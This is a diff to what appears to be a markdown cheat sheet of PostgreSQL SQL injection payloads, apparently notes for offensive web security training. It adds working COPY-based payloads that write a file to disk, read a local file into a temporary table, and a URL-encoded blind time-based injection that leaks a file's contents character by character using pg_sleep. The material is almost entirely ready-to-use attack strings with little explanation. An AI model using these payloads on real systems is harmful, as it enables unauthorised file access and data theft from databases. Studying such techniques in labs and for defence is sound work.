@@ -45,3 +45,26 @@ Check if executing as DBA:
 ```
 SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
 ```
+
+### Write to a File
+
+```
+COPY (select $$awae$$) to <file_name>
+COPY (select $$awae$$) to $$C:\pwnd.txt$$
+```
+
+### Read a File
+
+```
+DROP TABLE IF EXISTS awae;
+CREATE temp table awae (content text);
+COPY awae FROM $$c:\awae.txt$$;
+SELECT content FROM awae;
+DROP TABLE awae;
+```
+
+**Exfiltrating data (Blind)**
+
+```
+create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+
+```
